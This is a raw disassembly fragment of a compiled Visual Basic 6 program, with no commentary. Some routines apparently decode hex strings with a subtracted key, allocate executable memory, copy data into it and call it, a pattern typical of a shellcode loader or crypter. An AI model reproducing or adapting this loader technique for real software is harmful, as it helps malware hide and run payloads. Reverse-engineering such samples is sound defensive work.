.text:00407B3E                 sub     eax, [edx+14h]
.text:00407B41                 mov     edx, [esi+0Ch]
.text:00407B44                 mov     [edx+eax], cl
.text:00407B47                 lea     eax, [ebp-30h]
.text:00407B4A                 push    eax
.text:00407B4B                 lea     eax, [ebp-2Ch]
.text:00407B4E                 push    eax
.text:00407B4F                 push    2
.text:00407B51                 call    __vbaFreeStrList
.text:00407B56                 add     esp, 0Ch
.text:00407B59                 jmp     loc_407A8A
.text:00407B5E ; ---------------------------------------------------------------------------
.text:00407B5E
.text:00407B5E loc_407B5E:                             ; CODE XREF: .text:00407AA4↑j
.text:00407B5E                 mov     eax, [ebp+8]
.text:00407B61                 mov     eax, [eax+64h]
.text:00407B64                 mov     [ebp-38h], eax
.text:00407B67                 mov     dword ptr [ebp-40h], 2011h
.text:00407B6E                 lea     eax, [ebp-44h]
.text:00407B71                 push    eax
.text:00407B72                 push    10h
.text:00407B74                 pop     eax
.text:00407B75                 call    __vbaChkstk
.text:00407B7A                 lea     esi, [ebp-40h]
.text:00407B7D                 mov     edi, esp
.text:00407B7F                 movsd
.text:00407B80                 movsd
.text:00407B81                 movsd
.text:00407B82                 movsd
.text:00407B83                 mov     eax, [ebp+8]
.text:00407B86                 mov     eax, [eax]
.text:00407B88                 push    dword ptr [ebp+8]
.text:00407B8B                 call    dword ptr [eax+38h]
.text:00407B8E                 mov     [ebp-48h], eax
.text:00407B91                 cmp     dword ptr [ebp-48h], 0
.text:00407B95                 jge     short loc_407BAE
.text:00407B97                 push    38h ; '8'
.text:00407B99                 push    offset dword_4027CC
.text:00407B9E                 push    dword ptr [ebp+8]
.text:00407BA1                 push    dword ptr [ebp-48h]
.text:00407BA4                 call    __vbaHresultCheckObj
.text:00407BA9                 mov     [ebp-60h], eax
.text:00407BAC                 jmp     short loc_407BB2
.text:00407BAE ; ---------------------------------------------------------------------------
.text:00407BAE
.text:00407BAE loc_407BAE:                             ; CODE XREF: .text:00407B95↑j
.text:00407BAE                 and     dword ptr [ebp-60h], 0
.text:00407BB2
.text:00407BB2 loc_407BB2:                             ; CODE XREF: .text:00407BAC↑j
.text:00407BB2                 push    40h ; '@'
.text:00407BB4                 push    1000h
.text:00407BB9                 mov     eax, [ebp-44h]
.text:00407BBC                 add     eax, 1
.text:00407BBF                 jo      loc_407D44
.text:00407BC5                 push    eax
.text:00407BC6                 push    0
.text:00407BC8                 call    sub_40D1A8
.text:00407BCD                 mov     [ebp-24h], eax
.text:00407BD0                 mov     eax, [ebp+8]
.text:00407BD3                 mov     eax, [eax+64h]
.text:00407BD6                 mov     [ebp-38h], eax
.text:00407BD9                 mov     dword ptr [ebp-40h], 2011h
.text:00407BE0                 lea     eax, [ebp-44h]
.text:00407BE3                 push    eax
.text:00407BE4                 push    10h
.text:00407BE6                 pop     eax
.text:00407BE7                 call    __vbaChkstk
.text:00407BEC                 lea     esi, [ebp-40h]
.text:00407BEF                 mov     edi, esp
.text:00407BF1                 movsd
.text:00407BF2                 movsd
.text:00407BF3                 movsd
.text:00407BF4                 movsd
.text:00407BF5                 mov     eax, [ebp+8]
.text:00407BF8                 mov     eax, [eax]
.text:00407BFA                 push    dword ptr [ebp+8]
.text:00407BFD                 call    dword ptr [eax+38h]
.text:00407C00                 mov     [ebp-48h], eax
.text:00407C03                 cmp     dword ptr [ebp-48h], 0
.text:00407C07                 jge     short loc_407C20
.text:00407C09                 push    38h ; '8'
.text:00407C0B                 push    offset dword_4027CC
.text:00407C10                 push    dword ptr [ebp+8]
.text:00407C13                 push    dword ptr [ebp-48h]
.text:00407C16                 call    __vbaHresultCheckObj
.text:00407C1B                 mov     [ebp-64h], eax
.text:00407C1E                 jmp     short loc_407C24
.text:00407C20 ; ---------------------------------------------------------------------------
.text:00407C20
.text:00407C20 loc_407C20:                             ; CODE XREF: .text:00407C07↑j
.text:00407C20                 and     dword ptr [ebp-64h], 0
.text:00407C24
.text:00407C24 loc_407C24:                             ; CODE XREF: .text:00407C1E↑j
.text:00407C24                 mov     eax, [ebp+8]
.text:00407C27                 push    dword ptr [eax+64h]
.text:00407C2A                 lea     eax, [ebp-28h]
.text:00407C2D                 push    eax
.text:00407C2E                 call    __vbaAryLock
.text:00407C33                 push    0
.text:00407C35                 mov     eax, [ebp-44h]
.text:00407C38                 add     eax, 1
.text:00407C3B                 jo      loc_407D44
.text:00407C41                 push    eax
.text:00407C42                 mov     eax, [ebp-28h]
.text:00407C45                 xor     ecx, ecx
.text:00407C47                 sub     ecx, [eax+14h]
.text:00407C4A                 mov     eax, [ebp-28h]
.text:00407C4D                 mov     eax, [eax+0Ch]
.text:00407C50                 add     eax, ecx
.text:00407C52                 push    eax
.text:00407C53                 push    dword ptr [ebp-24h]
.text:00407C56                 push    0FFFFFFFFh
.text:00407C58                 call    sub_4029F8
.text:00407C5D                 call    __vbaSetSystemError
.text:00407C62                 lea     eax, [ebp-28h]
.text:00407C65                 push    eax
.text:00407C66                 call    __vbaAryUnlock
.text:00407C6B                 mov     eax, [ebp+1Ch]
.text:00407C6E                 push    dword ptr [eax]
.text:00407C70                 push    dword ptr [ebp+18h]
.text:00407C73                 push    dword ptr [ebp+14h]
.text:00407C76                 push    dword ptr [ebp+10h]
.text:00407C79                 push    dword ptr [ebp-24h]
.text:00407C7C                 call    sub_40A502
.text:00407C81                 mov     [ebp-1Ch], eax
.text:00407C84                 mov     eax, [ebp+8]
.text:00407C87                 mov     eax, [eax+64h]
.text:00407C8A                 mov     [ebp-38h], eax
.text:00407C8D                 mov     dword ptr [ebp-40h], 2011h
.text:00407C94                 lea     eax, [ebp-44h]
.text:00407C97                 push    eax
.text:00407C98                 push    10h
.text:00407C9A                 pop     eax
.text:00407C9B                 call    __vbaChkstk
.text:00407CA0                 lea     esi, [ebp-40h]
.text:00407CA3                 mov     edi, esp
.text:00407CA5                 movsd
.text:00407CA6                 movsd
.text:00407CA7                 movsd
.text:00407CA8                 movsd
.text:00407CA9                 mov     eax, [ebp+8]
.text:00407CAC                 mov     eax, [eax]
.text:00407CAE                 push    dword ptr [ebp+8]
.text:00407CB1                 call    dword ptr [eax+38h]
.text:00407CB4                 mov     [ebp-48h], eax
.text:00407CB7                 cmp     dword ptr [ebp-48h], 0
.text:00407CBB                 jge     short loc_407CD4
.text:00407CBD                 push    38h ; '8'
.text:00407CBF                 push    offset dword_4027CC
.text:00407CC4                 push    dword ptr [ebp+8]
.text:00407CC7                 push    dword ptr [ebp-48h]
.text:00407CCA                 call    __vbaHresultCheckObj
.text:00407CCF                 mov     [ebp-68h], eax
.text:00407CD2                 jmp     short loc_407CD8
.text:00407CD4 ; ---------------------------------------------------------------------------
.text:00407CD4
.text:00407CD4 loc_407CD4:                             ; CODE XREF: .text:00407CBB↑j
.text:00407CD4                 and     dword ptr [ebp-68h], 0
.text:00407CD8
.text:00407CD8 loc_407CD8:                             ; CODE XREF: .text:00407CD2↑j
.text:00407CD8                 push    1
.text:00407CDA                 push    1000h
.text:00407CDF                 mov     eax, [ebp-44h]
.text:00407CE2                 add     eax, 1
.text:00407CE5                 jo      short loc_407D44
.text:00407CE7                 push    eax
.text:00407CE8                 push    dword ptr [ebp-24h]
.text:00407CEB                 call    sub_40D1A8
.text:00407CF0                 wait
.text:00407CF1                 push    offset sub_407D1D
.text:00407CF6                 jmp     short loc_407D14
.text:00407CF8 ; ---------------------------------------------------------------------------
.text:00407CF8                 lea     eax, [ebp-28h]
.text:00407CFB                 push    eax
.text:00407CFC                 call    __vbaAryUnlock
.text:00407D01                 lea     eax, [ebp-30h]
.text:00407D04                 push    eax
.text:00407D05                 lea     eax, [ebp-2Ch]
.text:00407D08                 push    eax
.text:00407D09                 push    2
.text:00407D0B                 call    __vbaFreeStrList
.text:00407D10                 add     esp, 0Ch
.text:00407D13                 retn
.text:00407D14 ; ---------------------------------------------------------------------------
.text:00407D14
.text:00407D14 loc_407D14:                             ; CODE XREF: .text:00407CF6↑j
.text:00407D14                 lea     ecx, [ebp-20h]
.text:00407D17                 call    __vbaFreeStr
.text:00407D1C                 retn
.text:00407D1D
.text:00407D1D ; =============== S U B R O U T I N E =======================================
.text:00407D1D
.text:00407D1D
.text:00407D1D sub_407D1D      proc near               ; DATA XREF: .text:00407CF1↑o
.text:00407D1D                 mov     eax, [ebp+8]
.text:00407D20                 mov     eax, [eax]
.text:00407D22                 push    dword ptr [ebp+8]
.text:00407D25                 call    dword ptr [eax+8]
.text:00407D28                 mov     eax, [ebp+20h]
.text:00407D2B                 mov     ecx, [ebp-1Ch]
.text:00407D2E                 mov     [eax], ecx
.text:00407D30                 mov     eax, [ebp-4]
.text:00407D33                 mov     ecx, [ebp-14h]
.text:00407D36                 mov     large fs:0, ecx
.text:00407D3D                 pop     edi
.text:00407D3E                 pop     esi
.text:00407D3F                 pop     ebx
.text:00407D40                 leave
.text:00407D41                 retn    1Ch
.text:00407D41 sub_407D1D      endp ; sp-analysis failed
.text:00407D41
.text:00407D44 ; ---------------------------------------------------------------------------
.text:00407D44
.text:00407D44 loc_407D44:                             ; CODE XREF: .text:00407A6E↑j
.text:00407D44                                         ; .text:00407A92↑j ...
.text:00407D44                 call    __vbaErrorOverflow
.text:00407D49 ; ---------------------------------------------------------------------------
.text:00407D49
.text:00407D49 loc_407D49:                             ; CODE XREF: .text:00401A6D↑j
.text:00407D49                 push    ebp
.text:00407D4A                 mov     ebp, esp
.text:00407D4C                 sub     esp, 0Ch
.text:00407D4F                 push    offset __vbaExceptHandler
.text:00407D54                 mov     eax, large fs:0
.text:00407D5A                 push    eax
.text:00407D5B                 mov     large fs:0, esp
.text:00407D62                 push    1Ch
.text:00407D64                 pop     eax
.text:00407D65                 call    __vbaChkstk
.text:00407D6A                 push    ebx
.text:00407D6B                 push    esi
.text:00407D6C                 push    edi
.text:00407D6D                 mov     [ebp-0Ch], esp
.text:00407D70                 mov     dword ptr [ebp-8], 401148h
.text:00407D77                 mov     dword ptr [ebp-4], 0
.text:00407D7E                 mov     eax, [ebp+8]
.text:00407D81                 mov     eax, [eax]
.text:00407D83                 push    dword ptr [ebp+8]
.text:00407D86                 call    dword ptr [eax+4]
.text:00407D89                 call    sub_402A6C
.text:00407D8E                 call    __vbaSetSystemError
.text:00407D93                 push    0C0h
.text:00407D98                 push    0C0h
.text:00407D9D                 push    40000h
.text:00407DA2                 call    sub_402AB0
.text:00407DA7                 mov     [ebp-28h], eax
.text:00407DAA                 call    __vbaSetSystemError
.text:00407DAF                 mov     eax, [ebp-28h]
.text:00407DB2                 mov     [ebp-20h], eax
.text:00407DB5                 push    0
.text:00407DB7                 push    3Fh ; '?'
.text:00407DB9                 mov     eax, [ebp+0Ch]
.text:00407DBC                 push    dword ptr [eax]
.text:00407DBE                 lea     eax, [ebp-24h]
.text:00407DC1                 push    eax
.text:00407DC2                 call    __vbaStrToAnsi
.text:00407DC7                 push    eax
.text:00407DC8                 push    dword ptr [ebp-20h]
.text:00407DCB                 push    0FFFFFFFFh
.text:00407DCD                 call    sub_4029F8
.text:00407DD2                 call    __vbaSetSystemError
.text:00407DD7                 push    dword ptr [ebp-24h]
.text:00407DDA                 push    dword ptr [ebp+0Ch]
.text:00407DDD                 call    __vbaStrToUnicode
.text:00407DE2                 lea     ecx, [ebp-24h]
.text:00407DE5                 call    __vbaFreeStr
.text:00407DEA                 push    0
.text:00407DEC                 push    3Fh ; '?'
.text:00407DEE                 mov     eax, [ebp+10h]
.text:00407DF1                 push    dword ptr [eax]
.text:00407DF3                 lea     eax, [ebp-24h]
.text:00407DF6                 push    eax
.text:00407DF7                 call    __vbaStrToAnsi
.text:00407DFC                 push    eax
.text:00407DFD                 mov     eax, [ebp-20h]
.text:00407E00                 add     eax, 40h ; '@'
.text:00407E03                 jo      loc_407F37
.text:00407E09                 push    eax
.text:00407E0A                 push    0FFFFFFFFh
.text:00407E0C                 call    sub_4029F8
.text:00407E11                 call    __vbaSetSystemError
.text:00407E16                 push    dword ptr [ebp-24h]
.text:00407E19                 push    dword ptr [ebp+10h]
.text:00407E1C                 call    __vbaStrToUnicode
.text:00407E21                 lea     ecx, [ebp-24h]
.text:00407E24                 call    __vbaFreeStr
.text:00407E29                 mov     eax, [ebp+8]
.text:00407E2C                 mov     eax, [eax+44h]
.text:00407E2F                 mov     ecx, [ebp-20h]
.text:00407E32                 mov     [eax], ecx
.text:00407E34                 mov     eax, [ebp-20h]
.text:00407E37                 add     eax, 40h ; '@'
.text:00407E3A                 jo      loc_407F37
.text:00407E40                 mov     ecx, [ebp+8]
.text:00407E43                 mov     ecx, [ecx+44h]
.text:00407E46                 mov     [ecx+4], eax
.text:00407E49                 push    4
.text:00407E4B                 pop     eax
.text:00407E4C                 shl     eax, 1
.text:00407E4E                 mov     ecx, [ebp+8]
.text:00407E51                 mov     ecx, [ecx+44h]
.text:00407E54                 mov     dword ptr [ecx+eax], 40000h
.text:00407E5B                 mov     eax, [ebp-20h]
.text:00407E5E                 add     eax, 80h
.text:00407E63                 jo      loc_407F37
.text:00407E69                 push    4
.text:00407E6B                 pop     ecx
.text:00407E6C                 imul    ecx, 3
.text:00407E6F                 mov     edx, [ebp+8]
.text:00407E72                 mov     edx, [edx+44h]
.text:00407E75                 mov     [edx+ecx], eax
.text:00407E78                 push    0
.text:00407E7A                 push    1
.text:00407E7C                 push    0B8h
.text:00407E81                 call    __vbaCyI4
.text:00407E86                 push    edx
.text:00407E87                 push    eax
.text:00407E88                 call    __vbaCyMul
.text:00407E8D                 mov     [ebp-1Ch], eax
.text:00407E90                 mov     [ebp-18h], edx
.text:00407E93                 push    0
.text:00407E95                 push    100h
.text:00407E9A                 mov     eax, [ebp+8]
.text:00407E9D                 push    dword ptr [eax+44h]
.text:00407EA0                 call    DllFunctionCall
.text:00407EA5                 push    eax
.text:00407EA6                 call    __vbaCyI4
.text:00407EAB                 push    edx
.text:00407EAC                 push    eax
.text:00407EAD                 call    __vbaCyMul
.text:00407EB2                 push    edx
.text:00407EB3                 push    eax
.text:00407EB4                 push    dword ptr [ebp-18h]
.text:00407EB7                 push    dword ptr [ebp-1Ch]
.text:00407EBA                 call    __vbaCyAdd
.text:00407EBF                 mov     [ebp-1Ch], eax
.text:00407EC2                 mov     [ebp-18h], edx
.text:00407EC5                 push    100h
.text:00407ECA                 push    0
.text:00407ECC                 push    0E0FFh
.text:00407ED1                 call    __vbaCyI4
.text:00407ED6                 push    edx
.text:00407ED7                 push    eax
.text:00407ED8                 call    __vbaCyMul
.text:00407EDD                 push    edx
.text:00407EDE                 push    eax
.text:00407EDF                 push    dword ptr [ebp-18h]
.text:00407EE2                 push    dword ptr [ebp-1Ch]
.text:00407EE5                 call    __vbaCyAdd
.text:00407EEA                 mov     [ebp-1Ch], eax
.text:00407EED                 mov     [ebp-18h], edx
.text:00407EF0                 push    0
.text:00407EF2                 push    8
.text:00407EF4                 lea     eax, [ebp-1Ch]
.text:00407EF7                 push    eax
.text:00407EF8                 push    dword ptr [ebp+14h]
.text:00407EFB                 push    0FFFFFFFFh
.text:00407EFD                 call    sub_4029F8
.text:00407F02                 call    __vbaSetSystemError
.text:00407F07                 push    offset loc_407F18
.text:00407F0C                 jmp     short loc_407F17
.text:00407F0E ; ---------------------------------------------------------------------------
.text:00407F0E
.text:00407F0E loc_407F0E:                             ; DATA XREF: .text:00401154↑o
.text:00407F0E                 lea     ecx, [ebp-24h]
.text:00407F11                 call    __vbaFreeStr
.text:00407F16                 retn
.text:00407F17 ; ---------------------------------------------------------------------------
.text:00407F17
.text:00407F17 loc_407F17:                             ; CODE XREF: .text:00407F0C↑j
.text:00407F17                 retn
.text:00407F18 ; ---------------------------------------------------------------------------
.text:00407F18
.text:00407F18 loc_407F18:                             ; CODE XREF: .text:loc_407F17↑j
.text:00407F18                                         ; DATA XREF: .text:00407F07↑o
.text:00407F18                 mov     eax, [ebp+8]
.text:00407F1B                 mov     eax, [eax]
.text:00407F1D                 push    dword ptr [ebp+8]
.text:00407F20                 call    dword ptr [eax+8]
.text:00407F23                 mov     eax, [ebp-4]
.text:00407F26                 mov     ecx, [ebp-14h]
.text:00407F29                 mov     large fs:0, ecx
.text:00407F30                 pop     edi
.text:00407F31                 pop     esi
.text:00407F32                 pop     ebx
.text:00407F33                 leave
.text:00407F34                 retn    10h
.text:00407F37 ; ---------------------------------------------------------------------------
.text:00407F37
.text:00407F37 loc_407F37:                             ; CODE XREF: .text:00407E03↑j
.text:00407F37                                         ; .text:00407E3A↑j ...
.text:00407F37                 call    __vbaErrorOverflow
.text:00407F3C ; ---------------------------------------------------------------------------
.text:00407F3C
.text:00407F3C loc_407F3C:                             ; CODE XREF: .text:00401A7A↑j
.text:00407F3C                 push    ebp
.text:00407F3D                 mov     ebp, esp
.text:00407F3F                 sub     esp, 0Ch
.text:00407F42                 push    offset __vbaExceptHandler
.text:00407F47                 mov     eax, large fs:0
.text:00407F4D                 push    eax
.text:00407F4E                 mov     large fs:0, esp
.text:00407F55                 push    48h ; 'H'
.text:00407F57                 pop     eax
.text:00407F58                 call    __vbaChkstk
.text:00407F5D                 push    ebx
.text:00407F5E                 push    esi
.text:00407F5F                 push    edi
.text:00407F60                 mov     [ebp-0Ch], esp
.text:00407F63                 mov     dword ptr [ebp-8], offset dword_401158
.text:00407F6A                 mov     dword ptr [ebp-4], 0
.text:00407F71                 mov     eax, [ebp+8]
.text:00407F74                 mov     eax, [eax]
.text:00407F76                 push    dword ptr [ebp+8]
.text:00407F79                 call    dword ptr [eax+4]
.text:00407F7C                 mov     edx, [ebp+0Ch]
.text:00407F7F                 lea     ecx, [ebp-20h]
.text:00407F82                 call    __vbaStrCopy
.text:00407F87                 mov     edx, [ebp+14h]
.text:00407F8A                 lea     ecx, [ebp-2Ch]
.text:00407F8D                 call    __vbaStrCopy
.text:00407F92                 mov     eax, [ebp+18h]
.text:00407F95                 and     dword ptr [eax], 0
.text:00407F98                 mov     word ptr [ebp-3Ch], 400h
.text:00407F9E                 mov     word ptr [ebp-38h], 2
.text:00407FA4                 mov     word ptr [ebp-18h], 2
.text:00407FAA                 jmp     short loc_407FBE
.text:00407FAC ; ---------------------------------------------------------------------------
.text:00407FAC
.text:00407FAC loc_407FAC:                             ; CODE XREF: .text:004080DF↓j
.text:00407FAC                 mov     ax, [ebp-18h]
.text:00407FB0                 add     ax, [ebp-38h]
.text:00407FB4                 jo      loc_408147
.text:00407FBA                 mov     [ebp-18h], ax
.text:00407FBE
.text:00407FBE loc_407FBE:                             ; CODE XREF: .text:00407FAA↑j
.text:00407FBE                 mov     ax, [ebp-18h]
.text:00407FC2                 cmp     ax, [ebp-3Ch]
.text:00407FC6                 jg      loc_4080E4
.text:00407FCC                 lea     eax, [ebp-30h]
.text:00407FCF                 push    eax
.text:00407FD0                 push    2
.text:00407FD2                 movsx   eax, word ptr [ebp-18h]
.text:00407FD6                 push    eax
.text:00407FD7                 lea     eax, [ebp-20h]
.text:00407FDA                 push    eax
.text:00407FDB                 mov     eax, [ebp+8]
.text:00407FDE                 mov     eax, [eax]
.text:00407FE0                 push    dword ptr [ebp+8]
.text:00407FE3                 call    dword ptr [eax+28h]
.text:00407FE6                 mov     [ebp-34h], eax
.text:00407FE9                 cmp     dword ptr [ebp-34h], 0
.text:00407FED                 jge     short loc_408006
.text:00407FEF                 push    28h ; '('
.text:00407FF1                 push    offset dword_4027CC
.text:00407FF6                 push    dword ptr [ebp+8]
.text:00407FF9                 push    dword ptr [ebp-34h]
.text:00407FFC                 call    __vbaHresultCheckObj
.text:00408001                 mov     [ebp-50h], eax
.text:00408004                 jmp     short loc_40800A
.text:00408006 ; ---------------------------------------------------------------------------
.text:00408006
.text:00408006 loc_408006:                             ; CODE XREF: .text:00407FED↑j
.text:00408006                 and     dword ptr [ebp-50h], 0
.text:0040800A
.text:0040800A loc_40800A:                             ; CODE XREF: .text:00408004↑j
.text:0040800A                 mov     eax, [ebp-30h]
.text:0040800D                 mov     [ebp-48h], eax
.text:00408010                 and     dword ptr [ebp-30h], 0
.text:00408014                 mov     edx, [ebp-48h]
.text:00408017                 lea     ecx, [ebp-1Ch]
.text:0040801A                 call    __vbaStrMove
.text:0040801F                 push    dword ptr [ebp-1Ch]
.text:00408022                 push    0
.text:00408024                 call    __vbaStrCmp
.text:00408029                 test    eax, eax
.text:0040802B                 jnz     short loc_408032
.text:0040802D                 jmp     loc_4080E4
.text:00408032 ; ---------------------------------------------------------------------------
.text:00408032
.text:00408032 loc_408032:                             ; CODE XREF: .text:0040802B↑j
.text:00408032                 push    offset asc_402BEC ; "&H"
.text:00408037                 push    dword ptr [ebp-1Ch]
.text:0040803A                 call    __vbaStrCat
.text:0040803F                 mov     edx, eax
.text:00408041                 lea     ecx, [ebp-30h]
.text:00408044                 call    __vbaStrMove
.text:00408049                 push    eax
.text:0040804A                 call    __vbaR8Str
.text:0040804F                 call    __vbaFpUI1
.text:00408054                 mov     [ebp-28h], al
.text:00408057                 lea     ecx, [ebp-30h]
.text:0040805A                 call    __vbaFreeStr
.text:0040805F                 movzx   eax, byte ptr [ebp-28h]
.text:00408063                 mov     [ebp-54h], eax
.text:00408066                 fild    dword ptr [ebp-54h]
.text:00408069                 fstp    dword ptr [ebp-58h]
.text:0040806C                 mov     eax, [ebp+10h]
.text:0040806F                 fld     dword ptr [ebp-58h]
.text:00408072                 fsub    dword ptr [eax]
.text:00408074                 call    __vbaFpUI1
.text:00408079                 mov     [ebp-28h], al
.text:0040807C                 lea     eax, [ebp-30h]
.text:0040807F                 push    eax
.text:00408080                 movzx   ax, byte ptr [ebp-28h]
.text:00408085                 push    eax
.text:00408086                 mov     eax, [ebp+8]
.text:00408089                 mov     eax, [eax]
.text:0040808B                 push    dword ptr [ebp+8]
.text:0040808E                 call    dword ptr [eax+3Ch]
.text:00408091                 mov     [ebp-34h], eax
.text:00408094                 cmp     dword ptr [ebp-34h], 0
.text:00408098                 jge     short loc_4080B1
.text:0040809A                 push    3Ch ; '<'
.text:0040809C                 push    offset dword_4027CC
.text:004080A1                 push    dword ptr [ebp+8]
.text:004080A4                 push    dword ptr [ebp-34h]
.text:004080A7                 call    __vbaHresultCheckObj
.text:004080AC                 mov     [ebp-5Ch], eax
.text:004080AF                 jmp     short loc_4080B5
.text:004080B1 ; ---------------------------------------------------------------------------
.text:004080B1
.text:004080B1 loc_4080B1:                             ; CODE XREF: .text:00408098↑j
.text:004080B1                 and     dword ptr [ebp-5Ch], 0
.text:004080B5
.text:004080B5 loc_4080B5:                             ; CODE XREF: .text:004080AF↑j
.text:004080B5                 mov     eax, [ebp-30h]
.text:004080B8                 mov     [ebp-4Ch], eax
.text:004080BB                 and     dword ptr [ebp-30h], 0
.text:004080BF                 mov     edx, [ebp-4Ch]
.text:004080C2                 lea     ecx, [ebp-1Ch]
.text:004080C5                 call    __vbaStrMove
.text:004080CA                 push    dword ptr [ebp-1Ch]
.text:004080CD                 push    dword ptr [ebp-24h]
.text:004080D0                 call    __vbaStrCat
.text:004080D5                 mov     edx, eax
.text:004080D7                 lea     ecx, [ebp-24h]
.text:004080DA                 call    __vbaStrMove
.text:004080DF                 jmp     loc_407FAC
.text:004080E4 ; ---------------------------------------------------------------------------
.text:004080E4
.text:004080E4 loc_4080E4:                             ; CODE XREF: .text:00407FC6↑j
.text:004080E4                                         ; .text:0040802D↑j
.text:004080E4                 wait
.text:004080E5                 push    offset sub_408120
.text:004080EA                 jmp     short loc_408107
.text:004080EC ; ---------------------------------------------------------------------------
.text:004080EC                 mov     eax, [ebp-4]
.text:004080EF                 and     eax, 4
.text:004080F2                 test    eax, eax
.text:004080F4                 jz      short loc_4080FE
.text:004080F6                 lea     ecx, [ebp-24h]
.text:004080F9                 call    __vbaFreeStr
.text:004080FE
.text:004080FE loc_4080FE:                             ; CODE XREF: .text:004080F4↑j
.text:004080FE                 lea     ecx, [ebp-30h]
.text:00408101                 call    __vbaFreeStr
.text:00408106                 retn
.text:00408107 ; ---------------------------------------------------------------------------
.text:00408107
.text:00408107 loc_408107:                             ; CODE XREF: .text:004080EA↑j
.text:00408107                 lea     ecx, [ebp-1Ch]
.text:0040810A                 call    __vbaFreeStr
.text:0040810F                 lea     ecx, [ebp-20h]
.text:00408112                 call    __vbaFreeStr
.text:00408117                 lea     ecx, [ebp-2Ch]
.text:0040811A                 call    __vbaFreeStr
.text:0040811F                 retn
.text:00408120
.text:00408120 ; =============== S U B R O U T I N E =======================================
.text:00408120
.text:00408120
.text:00408120 sub_408120      proc near               ; DATA XREF: .text:004080E5↑o
.text:00408120                 mov     eax, [ebp+8]
.text:00408123                 mov     eax, [eax]
.text:00408125                 push    dword ptr [ebp+8]
.text:00408128                 call    dword ptr [eax+8]
.text:0040812B                 mov     eax, [ebp+18h]
.text:0040812E                 mov     ecx, [ebp-24h]
.text:00408131                 mov     [eax], ecx
.text:00408133                 mov     eax, [ebp-4]
.text:00408136                 mov     ecx, [ebp-14h]
.text:00408139                 mov     large fs:0, ecx
.text:00408140                 pop     edi
.text:00408141                 pop     esi
.text:00408142                 pop     ebx
.text:00408143                 leave
.text:00408144                 retn    14h
.text:00408144 sub_408120      endp ; sp-analysis failed
.text:00408144
.text:00408147 ; ---------------------------------------------------------------------------
.text:00408147
.text:00408147 loc_408147:                             ; CODE XREF: .text:00407FB4↑j
.text:00408147                 call    __vbaErrorOverflow
.text:0040814C ; ---------------------------------------------------------------------------
.text:0040814C
.text:0040814C loc_40814C:                             ; CODE XREF: .text:00401A87↑j
.text:0040814C                 push    ebp
.text:0040814D                 mov     ebp, esp
.text:0040814F                 push    8
.text:00408151                 pop     eax
.text:00408152                 call    __vbaChkstk
.text:00408157                 mov     eax, [ebp+0Ch]
.text:0040815A                 push    dword ptr [eax]
.text:0040815C                 call    __vbaR8Str
.text:00408161                 fstp    qword ptr [ebp-8]
.text:00408164                 mov     eax, [ebp+10h]
.text:00408167                 fld     qword ptr [ebp-8]
.text:0040816A                 fstp    qword ptr [eax]
.text:0040816C                 xor     eax, eax
.text:0040816E                 leave
.text:0040816F                 retn    0Ch
.text:00408172 ; ---------------------------------------------------------------------------
.text:00408172
.text:00408172 loc_408172:                             ; CODE XREF: .text:00401A94↑j
.text:00408172                 push    ebp
.text:00408173                 mov     ebp, esp
.text:00408175                 sub     esp, 0Ch
.text:00408178                 push    offset __vbaExceptHandler
.text:0040817D                 mov     eax, large fs:0
.text:00408183                 push    eax
.text:00408184                 mov     large fs:0, esp
.text:0040818B                 push    2Ch ; ','
.text:0040818D                 pop     eax
.text:0040818E                 call    __vbaChkstk
.text:00408193                 push    ebx
.text:00408194                 push    esi
.text:00408195                 push    edi
.text:00408196                 mov     [ebp-0Ch], esp
.text:00408199                 mov     dword ptr [ebp-8], offset dword_401168
.text:004081A0                 mov     dword ptr [ebp-4], 0
.text:004081A7                 mov     eax, [ebp+8]
.text:004081AA                 mov     eax, [eax]
.text:004081AC                 push    dword ptr [ebp+8]
.text:004081AF                 call    dword ptr [eax+4]
.text:004081B2                 mov     eax, [ebp+18h]
.text:004081B5                 and     dword ptr [eax], 0
.text:004081B8                 mov     eax, [ebp+14h]
.text:004081BB                 imul    eax, 2
.text:004081BE                 jo      loc_408246
.text:004081C4                 mov     [ebp-20h], eax
.text:004081C7                 mov     dword ptr [ebp-28h], 3
.text:004081CE                 lea     eax, [ebp-28h]
.text:004081D1                 push    eax
.text:004081D2                 mov     eax, [ebp+10h]
.text:004081D5                 imul    eax, 2
.text:004081D8                 jo      short loc_408246
.text:004081DA                 sub     eax, 1
.text:004081DD                 jo      short loc_408246
.text:004081DF                 push    eax
.text:004081E0                 mov     eax, [ebp+0Ch]
.text:004081E3                 push    dword ptr [eax]
.text:004081E5                 call    rtcMidBstr
.text:004081EA                 mov     edx, eax
.text:004081EC                 lea     ecx, [ebp-18h]
.text:004081EF                 call    __vbaStrMove
.text:004081F4                 lea     ecx, [ebp-28h]
.text:004081F7                 call    __vbaFreeVar
.text:004081FC                 push    offset loc_40821F
.text:00408201                 jmp     short loc_40821E
.text:00408203 ; ---------------------------------------------------------------------------
.text:00408203
.text:00408203 loc_408203:                             ; DATA XREF: .text:00401174↑o
.text:00408203                 mov     eax, [ebp-4]
.text:00408206                 and     eax, 4
.text:00408209                 test    eax, eax
.text:0040820B                 jz      short loc_408215
.text:0040820D                 lea     ecx, [ebp-18h]
.text:00408210                 call    __vbaFreeStr
.text:00408215
.text:00408215 loc_408215:                             ; CODE XREF: .text:0040820B↑j
.text:00408215                 lea     ecx, [ebp-28h]
.text:00408218                 call    __vbaFreeVar
.text:0040821D                 retn
.text:0040821E ; ---------------------------------------------------------------------------
.text:0040821E
.text:0040821E loc_40821E:                             ; CODE XREF: .text:00408201↑j
.text:0040821E                 retn
.text:0040821F ; ---------------------------------------------------------------------------
.text:0040821F
.text:0040821F loc_40821F:                             ; CODE XREF: .text:loc_40821E↑j
.text:0040821F                                         ; DATA XREF: .text:004081FC↑o
.text:0040821F                 mov     eax, [ebp+8]
.text:00408222                 mov     eax, [eax]
.text:00408224                 push    dword ptr [ebp+8]
.text:00408227                 call    dword ptr [eax+8]
.text:0040822A                 mov     eax, [ebp+18h]
.text:0040822D                 mov     ecx, [ebp-18h]
.text:00408230                 mov     [eax], ecx
.text:00408232                 mov     eax, [ebp-4]
.text:00408235                 mov     ecx, [ebp-14h]
.text:00408238                 mov     large fs:0, ecx
.text:0040823F                 pop     edi
.text:00408240                 pop     esi
.text:00408241                 pop     ebx
.text:00408242                 leave
.text:00408243                 retn    14h
.text:00408246 ; ---------------------------------------------------------------------------
.text:00408246
.text:00408246 loc_408246:                             ; CODE XREF: .text:004081BE↑j
.text:00408246                                         ; .text:004081D8↑j ...
.text:00408246                 call    __vbaErrorOverflow
.text:0040824B ; ---------------------------------------------------------------------------
.text:0040824B
